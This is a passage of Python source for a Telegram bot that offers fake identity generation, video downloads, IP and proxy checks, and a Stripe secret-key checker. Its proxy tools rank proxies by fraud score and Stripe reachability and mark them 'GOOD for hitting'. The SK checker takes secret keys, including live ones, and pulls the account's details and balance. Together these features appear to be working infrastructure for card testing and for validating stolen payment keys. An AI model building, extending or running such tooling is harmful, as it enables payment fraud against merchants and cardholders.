    'sa': ('ar_SA', '🇸🇦', 'Saudi Arabia'), 'saudi': ('ar_SA', '🇸🇦', 'Saudi Arabia'),
    'saudi arabia': ('ar_SA', '🇸🇦', 'Saudi Arabia'),
    'il': ('he_IL', '🇮🇱', 'Israel'), 'israel': ('he_IL', '🇮🇱', 'Israel'),
    'ir': ('fa_IR', '🇮🇷', 'Iran'), 'iran': ('fa_IR', '🇮🇷', 'Iran'),
    'jo': ('ar_JO', '🇯🇴', 'Jordan'), 'jordan': ('ar_JO', '🇯🇴', 'Jordan'),
    'eg': ('ar_EG', '🇪🇬', 'Egypt'), 'egypt': ('ar_EG', '🇪🇬', 'Egypt'),
    # Oceania
    'au': ('en_AU', '🇦🇺', 'Australia'), 'australia': ('en_AU', '🇦🇺', 'Australia'),
    'nz': ('en_NZ', '🇳🇿', 'New Zealand'), 'new zealand': ('en_NZ', '🇳🇿', 'New Zealand'),
    # South America
    'br': ('pt_BR', '🇧🇷', 'Brazil'), 'brazil': ('pt_BR', '🇧🇷', 'Brazil'),
    'ar': ('es_AR', '🇦🇷', 'Argentina'), 'argentina': ('es_AR', '🇦🇷', 'Argentina'),
    'cl': ('es_CL', '🇨🇱', 'Chile'), 'chile': ('es_CL', '🇨🇱', 'Chile'),
    'co': ('es_CO', '🇨🇴', 'Colombia'), 'colombia': ('es_CO', '🇨🇴', 'Colombia'),
    've': ('es_VE', '🇻🇪', 'Venezuela'), 'venezuela': ('es_VE', '🇻🇪', 'Venezuela'),
    'pe': ('es_PE', '🇵🇪', 'Peru'), 'peru': ('es_PE', '🇵🇪', 'Peru'),
    # Africa
    'za': ('en_ZA', '🇿🇦', 'South Africa'), 'south africa': ('en_ZA', '🇿🇦', 'South Africa'),
    'ng': ('en_NG', '🇳🇬', 'Nigeria'), 'nigeria': ('en_NG', '🇳🇬', 'Nigeria'),
    'ke': ('en_KE', '🇰🇪', 'Kenya'), 'kenya': ('en_KE', '🇰🇪', 'Kenya'),
}

@require_approval
async def fake_address_generator(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate fake address by country using Faker library"""
    import asyncio
    from faker import Faker
    user = update.effective_user
    
    locale_info = None
    if context.args:
        country_input = ' '.join(context.args).lower().strip()
        locale_info = FAKER_LOCALES.get(country_input)
        
        if not locale_info:
            unique_countries = {}
            for key, val in FAKER_LOCALES.items():
                unique_countries[val[2]] = f"{val[1]} {val[2]}"
            country_list = sorted(unique_countries.values())
            sample = ", ".join(country_list[:15]) + "..."
            
            await update.message.reply_text(
                f"❌ <b>Country not found:</b> {country_input}\n\n"
                f"<b>50+ countries supported!</b>\n"
                f"Examples: {sample}\n\n"
                f"<b>Usage:</b> <code>/fake us</code>, <code>/fake dubai</code>, <code>/fake japan</code>",
                parse_mode=ParseMode.HTML
            )
            return
    else:
        locale_info = ('en_US', '🇺🇸', 'United States')
    
    loading_msg = await update.message.reply_text(ae("🔄 Generating fake address..."))
    
    try:
        loop = asyncio.get_running_loop()
        locale, flag, country_name = locale_info
        
        def generate_with_faker():
            fake = Faker(locale)
            return {
                'name': fake.name(),
                'email': fake.email(),
                'street': fake.street_address(),
                'city': fake.city(),
                'state': getattr(fake, 'state', lambda: fake.city)() if hasattr(fake, 'state') else '',
                'postcode': fake.postcode(),
            }
        
        data = await loop.run_in_executor(None, generate_with_faker)
        
        city_state = f"{data['city']}, {data['state']}".strip(', ') if data['state'] else data['city']
        
        message = f"""✅ 𝗙𝗮𝗸𝗲 𝗜𝗻𝗳𝗼 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱

𝗡𝗮𝗺𝗲: {data['name']}
𝗠𝗮𝗶𝗹: {data['email']}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {flag} {country_name}
𝗦𝘁𝗿𝗲𝗲𝘁: {data['street']}
𝗔𝗱𝗱𝗿𝗲𝘀𝘀: {city_state}
𝗭𝗶𝗽𝗰𝗼𝗱𝗲: {data['postcode']}

𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 @{user.username or user.first_name}"""

        await loading_msg.edit_text(message, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"))

# ============================================================================
# SOCIAL MEDIA VIDEO DOWNLOADER
# ============================================================================

from modules.downloader import download_media, get_platform, get_platform_emoji, format_duration, SUPPORTED_PLATFORMS

@require_approval
async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Download videos from social media platforms"""
    user = update.effective_user
    
    if not context.args:
        platforms_list = ", ".join([f"{get_platform_emoji(p)} {p.title()}" for p in list(SUPPORTED_PLATFORMS.keys())[:8]])
        await update.message.reply_text(
            f"🎬 <b>Social Media Downloader</b>\n\n"
            f"<b>Usage:</b>\n"
            f"<code>/download [url]</code> - Download video\n"
            f"<code>/download [url] audio</code> - Download audio only\n\n"
            f"<b>Supported Platforms:</b>\n"
            f"{platforms_list}, and more!\n\n"
            f"<b>Examples:</b>\n"
            f"<code>/download https://tiktok.com/...</code>\n"
            f"<code>/download https://instagram.com/... audio</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = context.args[0]
    audio_only = len(context.args) > 1 and context.args[1].lower() in ['audio', 'mp3', 'music']
    
    platform = get_platform(url)
    if not platform:
        await update.message.reply_text(
            "❌ <b>Unsupported URL</b>\n\n"
            "Send a link from Instagram, TikTok, YouTube, Twitter/X, Facebook, Pinterest, Reddit, etc.",
            parse_mode=ParseMode.HTML
        )
        return
    
    emoji = get_platform_emoji(platform)
    mode_text = "🎵 audio" if audio_only else "📹 video"
    loading_msg = await update.message.reply_text(
        f"{emoji} <b>Downloading {platform.title()} {mode_text}...</b>\n\n"
        f"⏳ Please wait, this may take a moment...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        result, downloader = await download_media(url, audio_only)
        
        if not result["success"]:
            await loading_msg.edit_text(
                f"❌ <b>Download Failed</b>\n\n"
                f"<b>Platform:</b> {emoji} {platform.title()}\n"
                f"<b>Error:</b> {result['error']}",
                parse_mode=ParseMode.HTML
            )
            return
        
        file_path = result["file_path"]
        file_size = os.path.getsize(file_path) / (1024 * 1024)
        
        if file_size > 50:
            await loading_msg.edit_text(
                f"❌ <b>File Too Large</b>\n\n"
                f"File size: {file_size:.1f}MB (max 50MB)\n"
                f"Try a shorter video or use audio mode.",
                parse_mode=ParseMode.HTML
            )
            downloader.cleanup()
            return
        
        await loading_msg.edit_text(f"📤 <b>Uploading to Telegram...</b>", parse_mode=ParseMode.HTML)
        
        duration_text = format_duration(result["duration"]) if result["duration"] else "Unknown"
        caption = (
            f"{emoji} <b>{platform.title()}</b>\n\n"
            f"📌 <b>Title:</b> {result['title']}\n"
            f"⏱ <b>Duration:</b> {duration_text}\n"
            f"📦 <b>Size:</b> {file_size:.1f}MB\n\n"
            f"<i>Downloaded by @Onichanbabybot</i>"
        )
        
        with open(file_path, 'rb') as f:
            if audio_only:
                await update.message.reply_audio(
                    audio=f,
                    caption=caption,
                    parse_mode=ParseMode.HTML,
                    title=result['title'][:64] if result['title'] else "Audio"
                )
            else:
                await update.message.reply_video(
                    video=f,
                    caption=caption,
                    parse_mode=ParseMode.HTML,
                    supports_streaming=True
                )
        
        await loading_msg.delete()
        downloader.cleanup()
        
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error</b>\n\n{str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# IP REPUTATION CHECKER
# ============================================================================

from modules.ip_checker import full_ip_check, format_ip_report, is_valid_ip

@require_approval
async def ip_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check IP reputation and risk score"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔍 <b>IP Reputation Checker</b>\n\n"
            "<b>Usage:</b> <code>/ip &lt;ip_address&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/ip 8.8.8.8</code>\n"
            "<code>/ip 1.1.1.1</code>\n\n"
            "<i>Checks IP against multiple threat intelligence sources</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    ip = context.args[0].strip()
    
    if not is_valid_ip(ip):
        await update.message.reply_text(
            "❌ <b>Invalid IP Address</b>\n\n"
            f"<code>{ip}</code> is not a valid IPv4 address.\n\n"
            "<b>Format:</b> <code>xxx.xxx.xxx.xxx</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    loading_msg = await update.message.reply_text(
        f"🔍 <b>Scanning IP Address...</b>\n\n"
        f"📍 Target: <code>{ip}</code>\n"
        f"⏳ Checking threat databases...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        results = await full_ip_check(ip)
        report = format_ip_report(results)
        
        await loading_msg.edit_text(
            report,
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error checking IP</b>\n\n{str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# PROXY CHECKER
# ============================================================================

from modules.proxy_checker import (
    check_single_proxy, check_proxies, format_proxy_result, format_mass_results,
    test_proxy, test_proxies_batch, check_ip_info, parse_proxy, get_flag_emoji
)

@require_approval
async def proxy_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check proxy status, country, and details"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔍 <b>Proxy Checker</b>\n\n"
            "<b>Usage:</b> <code>/ckproxy &lt;proxy&gt;</code>\n\n"
            "<b>Supported Formats:</b>\n"
            "• <code>host:port</code>\n"
            "• <code>host:port:user:pass</code>\n"
            "• <code>user:pass@host:port</code>\n"
            "• <code>http://host:port</code>\n"
            "• <code>socks5://host:port</code>\n\n"
            "<b>Examples:</b>\n"
            "<code>/ckproxy 8.8.8.8:8080</code>\n"
            "<code>/ckproxy proxy.com:3128:user:pass</code>\n\n"
            "<b>Mass Check:</b>\n"
            "Send multiple proxies (one per line) or reply to a file",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if multiple proxies
    text = ' '.join(context.args)
    proxies = [p.strip() for p in text.replace(',', '\n').split('\n') if p.strip()]
    
    if len(proxies) == 1:
        # Single proxy check
        proxy = proxies[0]
        loading_msg = await update.message.reply_text(
            f"🔍 <b>Checking Proxy...</b>\n\n"
            f"📡 Proxy: <code>{proxy}</code>\n"
            f"⏳ Testing connection...",
            parse_mode=ParseMode.HTML
        )
        
        try:
            result = await check_single_proxy(proxy, timeout=15)
            report = format_proxy_result(result)
            
            await loading_msg.edit_text(
                report,
                parse_mode=ParseMode.HTML
            )
            
        except Exception as e:
            await loading_msg.edit_text(
                f"❌ <b>Error checking proxy</b>\n\n{str(e)[:200]}",
                parse_mode=ParseMode.HTML
            )
    else:
        # Mass proxy check (limit to 50)
        if len(proxies) > 50:
            proxies = proxies[:50]
            note = "\n<i>Note: Limited to first 50 proxies</i>"
        else:
            note = ""
        
        loading_msg = await update.message.reply_text(
            f"🔍 <b>Mass Proxy Check</b>\n\n"
            f"📊 Checking {len(proxies)} proxies...\n"
            f"⏳ Please wait...{note}",
            parse_mode=ParseMode.HTML
        )
        
        try:
            results = await check_proxies(proxies, timeout=15, max_concurrent=10)
            report = format_mass_results(results)
            
            await loading_msg.edit_text(
                report,
                parse_mode=ParseMode.HTML
            )
            
        except Exception as e:
            await loading_msg.edit_text(
                f"❌ <b>Error checking proxies</b>\n\n{str(e)[:200]}",
                parse_mode=ParseMode.HTML
            )

# ============================================================================
# UNIFIED PROXY MANAGER — /proxy add/del/clear/test/list + check-only
# ============================================================================

@require_approval
async def unified_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = update.message
    uid = user.id

    if not is_premium(uid):
        await message.reply_text(f"{EMOJI['lock']} <b>Premium Feature</b>\n\nProxy management requires premium.", parse_mode=ParseMode.HTML)
        return

    args_text = " ".join(context.args).strip() if context.args else ""

    if not args_text:
        await _proxy_show_list(message, uid)
        return

    sub, _, rest = args_text.partition(" ")
    sub = sub.lower()

    if sub == "add":
        await _proxy_add(message, uid, rest.strip())
    elif sub in ("del", "rm", "remove"):
        await _proxy_del(message, uid, rest.strip())
    elif sub == "clear":
        await _proxy_clear(message, uid)
    elif sub in ("test", "check"):
        await _proxy_test_all(message, uid)
    elif sub == "list":
        await _proxy_show_list(message, uid)
    elif sub == "mode":
        await _proxy_toggle_mode(message, uid, rest.strip())
    else:
        await _proxy_check_only(message, uid, args_text)


async def _proxy_show_list(message, uid):
    user_proxies = ah_get_user_proxies(uid)
    mode = get_user_proxy_mode(uid)
    mode_text = f"{EMOJI['charged']} Own Proxy" if mode == "own" else f"{EMOJI['plug']} System Proxy"

    if user_proxies:
        lines = "\n".join(f"<code>{p}</code>" for p in user_proxies[:15])
        if len(user_proxies) > 15:
            lines += f"\n<i>... and {len(user_proxies) - 15} more</i>"
    else:
        lines = "<i>None added</i>"

    text = (
        f"💜 <b>ONICHAN • PROXY</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ <b>Mode</b> : {mode_text}\n"
        f"📊 <b>Saved</b> : {len(user_proxies)}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{lines}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"/proxy add · /proxy del · /proxy clear\n"
        f"/proxy test · /proxy mode own|system"
    )
    await message.reply_text(text, parse_mode=ParseMode.HTML)


async def _proxy_add(message, uid, text):
    if not text:
        await message.reply_text("Usage: <code>/proxy add host:port:user:pass</code>", parse_mode=ParseMode.HTML)
        return

    lines = [l.strip() for l in text.split("\n") if l.strip()]
    if not lines:
        await message.reply_text(f"{EMOJI['declined']} No proxies provided.", parse_mode=ParseMode.HTML)
        return

    status_msg = await message.reply_text(
        f"{EMOJI['hitting']} Testing {len(lines)} proxy(s)...\nChecking IP, fraud score, and Stripe...",
        parse_mode=ParseMode.HTML
    )

    results = await test_proxies_batch(lines, concurrency=10)
    alive, dead = [], []
    for r in results:
        if r["alive"]:
            ah_add_user_proxy(uid, r["proxy"])
            alive.append(r)
        else:
            dead.append(r)

    alive_blocks = []
    for r in alive[:5]:
        stripe_s = EMOJI["charged"] if r["stripe"] else EMOJI["declined"]
        alive_blocks.append(
            f"{EMOJI['charged']} <code>{r['proxy']}</code>\n"
            f"   IP ~ <code>{r['ip']}</code> | {r['country']} | <code>{r['ms']}ms</code>\n"
            f"   Stripe ~ {stripe_s}"
        )
    dead_lines = "\n".join(f"{EMOJI['declined']} <code>{r['proxy']}</code> — {r['error']}" for r in dead[:3])
    if len(alive) > 5:
        alive_blocks.append(f"<i>... and {len(alive)-5} more added</i>")

    output = (
        f"💜 <b>PROXY • ADD</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Alive : {len(alive)}/{len(lines)}\n"
        f"❌ Dead  : {len(dead)}/{len(lines)}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
    )
    if alive_blocks:
        output += "<b>Added:</b>\n" + "\n\n".join(alive_blocks) + "\n"
    if dead_lines:
        output += f"\n<b>Failed:</b>\n{dead_lines}"

    if len(output) > 4096:
        output = output[:4090] + "\n<i>...</i>"
    await status_msg.edit_text(output, parse_mode=ParseMode.HTML)


async def _proxy_del(message, uid, proxy):
    if not proxy:
        await message.reply_text("Usage: <code>/proxy del host:port:user:pass</code>", parse_mode=ParseMode.HTML)
        return
    ah_remove_user_proxy(uid, proxy)
    await message.reply_text(f"{EMOJI['trash']} Removed: <code>{proxy}</code>", parse_mode=ParseMode.HTML)


async def _proxy_clear(message, uid):
    user_proxies = ah_get_user_proxies(uid)
    count = len(user_proxies)
    ah_remove_user_proxy(uid, "all")
    await message.reply_text(f"{EMOJI['trash']} Cleared {count} proxy(s).", parse_mode=ParseMode.HTML)


async def _proxy_test_all(message, uid):
    proxies = ah_get_user_proxies(uid)
    if not proxies:
        await message.reply_text(f"{EMOJI['declined']} No proxies to test. Add one with <code>/proxy add</code>.", parse_mode=ParseMode.HTML)
        return

    status_msg = await message.reply_text(
        f"{EMOJI['hitting']} Testing {len(proxies)} proxy(s)...\nChecking IP, fraud score, and Stripe...",
        parse_mode=ParseMode.HTML
    )

    results = await test_proxies_batch(proxies, concurrency=10)
    alive = [r for r in results if r["alive"]]
    dead = [r for r in results if not r["alive"]]
    stripe_ok = [r for r in alive if r["stripe"]]

    blocks = []
    for r in results[:10]:
        if r["alive"]:
            stripe_status = f"{EMOJI['charged']} YES" if r["stripe"] else f"{EMOJI['declined']} NO"
            stripe_lat = f" ({r['stripe_ms']}ms)" if r.get("stripe_ms") else ""

            fs = r.get("fraud_score")
            if fs is not None:
                if fs <= 20:
                    fraud_line = f"{EMOJI['charged']} <code>{fs}/100</code> (Clean)"
                elif fs <= 50:
                    fraud_line = f"{EMOJI['error']} <code>{fs}/100</code> (Medium)"
                elif fs <= 75:
                    fraud_line = f"{EMOJI['risky']} <code>{fs}/100</code> (Risky)"
                else:
                    fraud_line = f"{EMOJI['danger']} <code>{fs}/100</code> (High Risk)"
            else:
                fraud_line = "─"

            proxy_flag = ""
            if r.get("is_proxy") == "yes":
                proxy_flag += " [Proxy]"
            if r.get("is_vpn") == "yes":
                proxy_flag += " [VPN]"

            blocks.append(
                f"{EMOJI['charged']} <code>{r['proxy']}</code>\n"
                f"   IP ~ <code>{r['ip']}</code>\n"
                f"   Country ~ <code>{r['country']}</code> (<code>{r['country_code']}</code>)\n"
                f"   ISP ~ <code>{r['isp']}</code>\n"
                f"   Type ~ <code>{r['type']}</code>{proxy_flag}\n"
                f"   Latency ~ <code>{r['ms']}ms</code>\n"
                f"   Fraud ~ {fraud_line}\n"
                f"   Stripe ~ {stripe_status}{stripe_lat}"
            )
        else:
            blocks.append(
                f"{EMOJI['declined']} <code>{r['proxy']}</code>\n"
                f"   Error ~ {r['error']}"
            )

    text = (
        f"💜 <b>PROXY • CHECK</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total : {len(proxies)} | ✅ {len(alive)} | ❌ {len(dead)}\n"
        f"💳 Stripe OK : {len(stripe_ok)}/{len(alive)}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        + "\n\n".join(blocks)
    )
    if len(proxies) > 10:
        text += f"\n\n<i>... and {len(proxies)-10} more</i>"
    text += "\n\n<i>Fraud data by proxycheck.io</i>"

    await status_msg.edit_text(text[:4096], parse_mode=ParseMode.HTML)


async def _proxy_toggle_mode(message, uid, mode_arg):
    if mode_arg in ("own", "personal", "mine"):
        user_proxies = ah_get_user_proxies(uid)
        if not user_proxies:
            await message.reply_text(f"{EMOJI['declined']} Add a proxy first with <code>/proxy add</code>.", parse_mode=ParseMode.HTML)
            return
        set_user_proxy_mode(uid, "own")
        await message.reply_text(f"{EMOJI['charged']} Proxy mode set to <b>Own Proxy</b>. Your proxies will be used for hitting.", parse_mode=ParseMode.HTML)
    elif mode_arg in ("system", "pool", "default"):
        set_user_proxy_mode(uid, "system")
        await message.reply_text(f"{EMOJI['plug']} Proxy mode set to <b>System Proxy</b>. System pool will be used.", parse_mode=ParseMode.HTML)
    else:
        current = get_user_proxy_mode(uid)
        mode_text = "Own Proxy" if current == "own" else "System Proxy"
        await message.reply_text(
            f"💜 <b>PROXY • MODE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Current : <b>{mode_text}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"/proxy mode own · /proxy mode system",
            parse_mode=ParseMode.HTML
        )


async def _proxy_check_only(message, uid, proxy_str):
    if not proxy_str:
        await message.reply_text(
            f"💜 <b>PROXY • CHECK</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"/proxy [proxy] — Check only\n"
            f"/proxy add [proxy] — Check + save",
            parse_mode=ParseMode.HTML,
        )
        return

    status_msg = await message.reply_text(f"{EMOJI['hitting']} Checking proxy...", parse_mode=ParseMode.HTML)

    r = await test_proxy(proxy_str)

    if not r["alive"]:
        await status_msg.edit_text(
            f"💜 <b>PROXY • CHECK</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{EMOJI['declined']} <code>{html.escape(proxy_str)}</code>\n"
            f"❌ {html.escape(str(r['error']))}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>Dead — not saved.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    stripe_s = f"{EMOJI['charged']} YES ({r['stripe_ms']}ms)" if r["stripe"] else f"{EMOJI['declined']} NO"
    fs = r.get("fraud_score")
    if fs is not None:
        if fs <= 20:
            fraud_line = f"{EMOJI['charged']} <code>{fs}/100</code> (Clean)"
        elif fs <= 50:
            fraud_line = f"{EMOJI['error']} <code>{fs}/100</code> (Medium)"
        else:
            fraud_line = f"{EMOJI['danger']} <code>{fs}/100</code> (Risky)"
    else:
        fraud_line = "─"

    _checked_proxies[uid] = proxy_str
    kb = InlineKeyboardMarkup([
        [
            _btn("Save Proxy", style="success", icon=EID["charged"], callback_data=f"saveproxy_{uid}"),
            _btn("Discard", style="default", icon=EID["declined"], callback_data=f"discardproxy_{uid}"),
        ]
    ])
    text = (
        f"💜 <b>PROXY • CHECK</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMOJI['charged']} <code>{html.escape(proxy_str)}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>IP</b>      : <code>{html.escape(str(r['ip']))}</code>\n"
        f"🌍 <b>Country</b> : {html.escape(str(r['country']))} ({html.escape(str(r['country_code']))})\n"
        f"🏢 <b>ISP</b>     : {html.escape(str(r['isp']))}\n"
        f"📡 <b>Type</b>    : {html.escape(str(r['type']))}\n"
        f"⏱ <b>Latency</b> : {r['ms']}ms\n"
        f"🛡 <b>Fraud</b>   : {fraud_line}\n"
        f"💳 <b>Stripe</b>  : {stripe_s}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Save this proxy?"
    )
    await status_msg.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)


async def save_proxy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = int(query.data.split("_")[1])
    if query.from_user.id != uid:
        await query.answer("Not your session.", show_alert=True)
        return
    proxy_str = _checked_proxies.pop(uid, None)
    if not proxy_str:
        await query.answer("Session expired.", show_alert=True)
        return
    ah_add_user_proxy(uid, proxy_str)
    await query.answer("Proxy saved!")
    await query.edit_message_text(
        f"{EMOJI['charged']} Proxy <code>{proxy_str}</code> saved to your account.",
        parse_mode=ParseMode.HTML,
    )


async def discard_proxy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = int(query.data.split("_")[1])
    if query.from_user.id != uid:
        await query.answer("Not your session.", show_alert=True)
        return
    _checked_proxies.pop(uid, None)
    await query.answer("Discarded.")
    await query.edit_message_text(
        f"{EMOJI['declined']} Proxy discarded. Not saved.",
        parse_mode=ParseMode.HTML,
    )


# ============================================================================
# IP CHECK — /ipcheck [ip]
# ============================================================================

@require_approval
async def ipcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    args = context.args if context.args else []
    ip_to_check = None
    proxy_str = None
    label = "Bot Hosting IP"

    if args and args[0].lower() == "proxy":
        mode = get_user_proxy_mode(uid)
        if mode == "own":
            user_proxies = ah_get_user_proxies(uid)
            if user_proxies:
                proxy_str = user_proxies[0]
                label = "Your Proxy IP"
        if not proxy_str:
            from config import SYSTEM_PROXIES
            if SYSTEM_PROXIES:
                proxy_str = random.choice(SYSTEM_PROXIES)
                label = "System Proxy IP"
        if not proxy_str:
            await update.message.reply_text(f"{EMOJI['declined']} No proxy configured.", parse_mode=ParseMode.HTML)
            return
    elif args:
        ip_to_check = args[0].strip()
        label = f"IP <code>{html.escape(ip_to_check)}</code>"

    status_msg = await update.message.reply_text(
        f"{EMOJI['hitting']} Checking {label}...",
        parse_mode=ParseMode.HTML
    )

    try:
        result = await check_ip_info(ip_to_check, proxy_str)

        if result.get("error"):
            err_msg = re.sub(r'https?://[^\s,\'\"]+', '[proxy]', str(result['error']))
            await status_msg.edit_text(f"{EMOJI['declined']} Error: {html.escape(err_msg)}", parse_mode=ParseMode.HTML)
            return

        country = result.get("country", "?")
        cc = result.get("country_code", "?")
        isp = result.get("isp", "?")
        ip_type = result.get("ip_type", "Unknown")
        flag = get_flag_emoji(cc)

        fs = result.get("fraud_score")
        if fs is not None:
            if fs <= 20:
                fraud_line = f"{EMOJI['charged']} <code>{fs}/100</code> (Clean)"
            elif fs <= 50:
                fraud_line = f"{EMOJI['error']} <code>{fs}/100</code> (Medium)"
            elif fs <= 75:
                fraud_line = f"{EMOJI['risky']} <code>{fs}/100</code> (Risky)"
            else:
                fraud_line = f"{EMOJI['danger']} <code>{fs}/100</code> (High Risk)"
        else:
            fraud_line = "─ (unavailable)"

        flags = []
        if result.get("is_proxy") == "yes":
            flags.append("Proxy")
        if result.get("is_vpn") == "yes":
            flags.append("VPN")
        flag_str = f" [{', '.join(flags)}]" if flags else ""

        stripe_ok = result.get("stripe", False)
        stripe_ms = result.get("stripe_ms")
        stripe_line = f"{EMOJI['charged']} YES ({stripe_ms}ms)" if stripe_ok else f"{EMOJI['declined']} NO"

        text = (
            f"💜 <b>ONICHAN • IP</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>IP</b>      : <code>{result.get('ip', '?')}</code>\n"
            f"🌍 <b>Country</b> : {flag} {country} ({cc})\n"
            f"🏢 <b>ISP</b>     : {isp}\n"
            f"📡 <b>Type</b>    : {ip_type}{flag_str}\n"
            f"🛡 <b>Fraud</b>   : {fraud_line}\n"
            f"💳 <b>Stripe</b>  : {stripe_line}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
        )

        if stripe_ok and (fs is None or fs <= 50):
            text += f"\n{EMOJI['charged']} <b>GOOD for hitting</b>"
        elif stripe_ok and fs and fs <= 75:
            text += f"\n{EMOJI['error']} <b>Usable but risky</b>"
        elif not stripe_ok:
            text += f"\n{EMOJI['declined']} <b>Cannot reach Stripe</b>"
        else:
            text += f"\n{EMOJI['danger']} <b>High fraud score — likely blocked</b>"

        text += "\n\n<i>Fraud data by proxycheck.io</i>"
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML)

    except Exception as e:
        await status_msg.edit_text(f"{EMOJI['declined']} Error: {str(e)[:60]}", parse_mode=ParseMode.HTML)


# ============================================================================
# SK CHECKER - STRIPE SECRET KEY INFO
# ============================================================================

@require_approval
async def sk_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check Stripe Secret Key info"""
    user = update.effective_user

    if not context.args:
        await update.message.reply_text(
            "🔑 <b>SK Checker</b>\n\n"
            "<b>Usage:</b> <code>/sk &lt;secret_key&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/sk sk_live_xxxxxxxxxxxx</code>\n\n"
            "Returns account info, balance, and charge status.",
            parse_mode=ParseMode.HTML
        )
        return

    sk = context.args[0].strip()

    if not sk.startswith("sk_live_") and not sk.startswith("sk_test_"):
        await update.message.reply_text(
            "❌ <b>Invalid SK</b>\n\nMust start with <code>sk_live_</code> or <code>sk_test_</code>",
            parse_mode=ParseMode.HTML
        )
        return

    loading_msg = await update.message.reply_text(
        "🔍 <b>Checking SK...</b>\n\n⏳ Fetching account info...",
        parse_mode=ParseMode.HTML
    )

    try:
        import httpx
        async with httpx.AsyncClient(timeout=15) as session:
            headers = {"Authorization": f"Bearer {sk}"}
            skinfo_resp = await session.get("https://api.stripe.com/v1/account", headers=headers)
            skinfo = skinfo_resp.json()

            if "error" in skinfo:
                err_msg = skinfo["error"].get("message", "Invalid or expired SK")
                await loading_msg.edit_text(
                    f"❌ <b>SK Check Failed</b>\n\n{html.escape(err_msg)}",
                    parse_mode=ParseMode.HTML
                )
                return

            balance_resp = await session.get("https://api.stripe.com/v1/balance", headers=headers)
            balance_info = balance_resp.json()

        charges_enabled = skinfo.get("charges_enabled", False)
        payouts_enabled = skinfo.get("payouts_enabled", False)
        biz = skinfo.get("business_profile", {})
        url = biz.get("url") or "N/A"
        name_data = biz.get("name") or "N/A"
        currency = (skinfo.get("default_currency") or "N/A").upper()
        country = skinfo.get("country") or "N/A"
        email = skinfo.get("email") or "N/A"
        sk_type = skinfo.get("type") or "N/A"

        available_raw = balance_info.get("available", [{}])
        pending_raw = balance_info.get("pending", [{}])
        livemode = balance_info.get("livemode", False)

        available_parts = []
        for b in available_raw:
            amt = b.get("amount", 0)
            cur = (b.get("currency") or "").upper()
            available_parts.append(f"{amt/100:.2f} {cur}")
        available_str = ", ".join(available_parts) if available_parts else "0.00"

        pending_parts = []
        for b in pending_raw:
            amt = b.get("amount", 0)
            cur = (b.get("currency") or "").upper()
            pending_parts.append(f"{amt/100:.2f} {cur}")
        pending_str = ", ".join(pending_parts) if pending_parts else "0.00"

        charges_icon = "✅" if charges_enabled else "❌"
        payouts_icon = "✅" if payouts_enabled else "❌"
        live_icon = "✅" if livemode else "❌"

        masked_sk = f"{sk[:7]}...{sk[-4:]}" if len(sk) > 12 else sk

        resp = (
            f"<b>SK Info Fetched Successfully ✅</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"🔑 <b>SK:</b> <code>{html.escape(masked_sk)}</code>\n"
            f"🏢 <b>Name:</b> {html.escape(str(name_data))}\n"
            f"🌐 <b>Website:</b> {html.escape(str(url))}\n"
            f"🌍 <b>Country:</b> {html.escape(str(country))}\n"
            f"💱 <b>Currency:</b> {html.escape(str(currency))}\n"
            f"📧 <b>Email:</b> {html.escape(str(email))}\n"
            f"🏷️ <b>Type:</b> {html.escape(str(sk_type))}\n"
            f"━━━━━━━━━━━━━━\n"
            f"💰 <b>Balance Info:</b>\n"
